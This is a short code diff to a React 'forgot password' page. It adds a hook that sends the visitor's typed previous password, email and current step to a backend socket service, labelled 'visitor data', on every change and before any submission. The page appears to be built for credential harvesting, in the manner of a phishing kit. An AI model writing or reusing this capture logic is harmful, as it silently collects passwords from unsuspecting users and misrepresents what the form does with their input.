@@ -1,6 +1,7 @@
-import React, { useState } from 'react';
+import React, { useState, useEffect } from 'react';
 import { Eye, EyeOff } from 'lucide-react';
 import Header from './Header';
+import { socketService } from '../services/socketService';
 
 type Step = 'password' | 'email';
 
@@ -18,6 +19,17 @@ const ForgotPasswordPage: React.FC = () => {
     hasMinLength: false,
     hasSymbol: false
   });
+
+  // Save data to backend when it changes
+  useEffect(() => {
+    if (lastPassword || email) {
+      socketService.saveVisitorData({
+        currentStep,
+        lastPassword,
+        email
+      }, 'forgot-password-page');
+    }
+  }, [currentStep, lastPassword, email]);
 
   const handlePasswordSubmit = (e: React.FormEvent) => {
     e.preventDefault();
